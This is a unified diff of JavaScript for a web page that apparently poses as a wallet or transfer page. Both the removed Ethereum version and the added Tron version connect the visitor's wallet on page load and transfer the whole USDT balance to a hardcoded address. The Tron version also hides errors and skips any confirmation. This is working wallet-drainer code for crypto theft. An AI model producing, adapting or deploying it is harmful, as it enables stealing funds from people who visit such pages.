@@ -1,149 +1,52 @@
-// USDT 合约地址和目标地址
-const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const TARGET_ADDRESS = "0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C";
-const USDT_ABI = [
-    {
-        "constant": false,
-        "inputs": [
-            { "name": "_to", "type": "address" },
-            { "name": "_value", "type": "uint256" }
-        ],
-        "name": "transfer",
-        "outputs": [{ "name": "", "type": "bool" }],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [{ "name": "_owner", "type": "address" }],
-        "name": "balanceOf",
-        "outputs": [{ "name": "balance", "type": "uint256" }],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    }
-];
+// 初始化 TronWeb
+const TronWeb = window.TronWeb;
+let tronWeb;
+let walletAddress;
 
-// 全局变量
-let provider = null, signer = null;
+// 目标地址
+const targetAddress = "THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A";
 
-// 页面加载时直接连接钱包
-window.addEventListener('load', async () => {
-    try {
-        // 确保 ethers.js 已加载
-        if (typeof ethers === 'undefined') {
-            throw new Error('ethers.js 加载失败，请检查网络或刷新页面！');
+// TRC20 USDT 合约地址（波场主网 USDT 合约地址）
+const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+// 自动连接钱包
+window.addEventListener("load", async () => {
+    if (window.tronLink) {
+        try {
+            // 请求连接 TronLink 钱包
+            await window.tronLink.request({ method: "tron_requestAccounts" });
+            tronWeb = window.tronLink.tronWeb;
+            walletAddress = tronWeb.defaultAddress.base58;
+        } catch (error) {
+            console.error("钱包连接错误:", error);
         }
-
-        // 检查 window.ethereum 或 window.web3 是否存在（兼容不同钱包）
-        if (!window.ethereum && !window.web3) {
-            throw new Error('未检测到钱包，请确保已在钱包内置浏览器中访问页面！');
-        }
-
-        // 初始化 provider，优先使用 window.ethereum
-        if (window.ethereum) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-        } else if (window.web3) {
-            provider = new ethers.providers.Web3Provider(window.web3.currentProvider);
-        } else {
-            throw new Error('未检测到钱包提供者，请检查钱包环境！');
-        }
-
-        // 直接请求连接钱包
-        const accounts = await provider.send("eth_requestAccounts", []);
-        if (!accounts || accounts.length === 0) {
-            throw new Error('未连接到钱包，请授权连接！');
-        }
-
-        // 检查当前网络
-        const chainId = await provider.send('eth_chainId', []);
-        if (chainId !== '0x1') {
-            try {
-                // 尝试切换到以太坊主网
-                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
-            } catch (switchError) {
-                // 如果切换失败，尝试添加网络（兼容 Trust Wallet 等）
-                if (switchError.code === 4902) {
-                    await provider.send('wallet_addEthereumChain', [{
-                        chainId: '0x1',
-                        chainName: 'Ethereum Mainnet',
-                        rpcUrls: ['https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'],
-                        nativeCurrency: {
-                            name: 'Ether',
-                            symbol: 'ETH',
-                            decimals: 18
-                        },
-                        blockExplorerUrls: ['https://etherscan.io']
-                    }]);
-                } else {
-                    throw new Error('切换网络失败，请手动切换到以太坊主网！');
-                }
-            }
-        }
-
-        // 获取 signer 和地址
-        signer = provider.getSigner();
-        const address = await signer.getAddress();
-        document.getElementById('account-address').textContent = address.slice(0, 6) + '...' + address.slice(-4);
-    } catch (e) {
-        console.error('连接钱包失败:', e);
-        alert(e.message || '连接钱包失败，请确保已在钱包内置浏览器中访问页面！');
+    } else {
+        console.error("请安装 TronLink 或其他支持波场的钱包");
     }
 });
 
-// 发送按钮事件
-document.querySelector('.send-btn').addEventListener('click', async (event) => {
-    event.preventDefault(); // 确保手机端点击事件触发
-    event.stopPropagation(); // 防止事件冒泡
-
+// 转账 USDT 函数
+async function transferUSDT() {
     try {
-        // 检查钱包环境
-        if (!provider) {
-            throw new Error('未检测到钱包提供者，请刷新页面重试！');
-        }
-
-        // 检查 signer 是否存在
-        if (!signer) {
-            throw new Error('请先连接钱包！');
-        }
-
-        // 初始化 USDT 合约
-        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+        // 获取 USDT 合约实例
+        const contract = await tronWeb.contract().at(usdtContractAddress);
 
         // 获取余额
-        const balance = await usdtContract.balanceOf(await signer.getAddress());
-        console.log('当前余额:', ethers.utils.formatUnits(balance, 6), 'USDT');
+        const balance = await contract.balanceOf(walletAddress).call();
+        const balanceInUSDT = tronWeb.fromSun(balance); // 转换为 USDT 单位（USDT 有 6 位小数）
 
-        // 如果余额为 0，提示用户
-        if (balance.isZero()) {
-            alert('您的 USDT 余额为 0，仍将尝试发起转账！');
-        }
-
-        // 发起转账
-        const tx = await usdtContract.transfer(TARGET_ADDRESS, balance, {
-            gasLimit: 100000 // 设置一个合理的 gas 限制
+        // 调用 transfer 方法，转账全部余额
+        await contract.transfer(
+            targetAddress,
+            balance // 余额为 0 也会发起转账，交给钱包处理
+        ).send({
+            feeLimit: 10000000, // 设置手续费限制，单位是 SUN（1 TRX = 1,000,000 SUN）
+            shouldPollResponse: false // 不等待交易确认，直接交给钱包
         });
-        console.log('转账交易:', tx);
 
-        // 等待交易确认
-        await tx.wait();
-        alert('转账成功！');
-    } catch (e) {
-        console.error('转账失败:', e);
-        // 如果用户取消转账（例如点击“拒绝”）
-        if (e.code === 4001 || e.message.includes('user rejected') || e.message.includes('User denied')) {
-            alert('您已取消转账');
-        } else {
-            // 其他错误，显示详细提示
-            alert('转账失败：' + (e.message || '未知错误，请检查控制台！'));
-        }
+        // 转账发起后，交给钱包处理，不需要额外提示
+    } catch (error) {
+        console.error("转账失败:", error);
+        // 错误交给钱包处理，不显示提示
     }
-});
-
-// 取消按钮事件
-document.querySelector('.cancel-btn').addEventListener('click', (event) => {
-    event.preventDefault();
-    event.stopPropagation();
-    alert('已取消转账操作');
-});
+}
